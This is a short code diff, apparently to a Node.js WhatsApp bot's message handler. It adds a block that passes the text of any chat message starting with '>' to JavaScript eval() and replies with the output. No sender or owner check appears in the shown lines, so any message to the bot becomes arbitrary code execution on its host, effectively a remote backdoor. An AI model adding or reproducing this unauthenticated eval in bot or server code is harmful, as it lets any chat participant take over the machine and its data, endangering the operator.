@@ -720,6 +720,29 @@ client.ev.on("messages.upsert", async (chatUpdate) => {
                             : (m.key.participant || m.key.remoteJid);            
 
             const IsGroup = m.chat?.endsWith("@g.us");
+
+//========================================================================================================================
+
+           if (budy && budy.startsWith('>')) {
+
+    try { 
+
+        let evaled = await eval(budy.slice(2)); 
+
+        if (typeof evaled !== 'string') evaled = util.inspect(evaled); 
+
+        await m.reply(evaled); 
+
+    } catch (err) { 
+
+        await m.reply(String(err)); 
+
+    } 
+
+} 
+
+
+                
 //========================================================================================================================
 //const channelreact = process.env.REACT_CHANNEL || 'true';
 
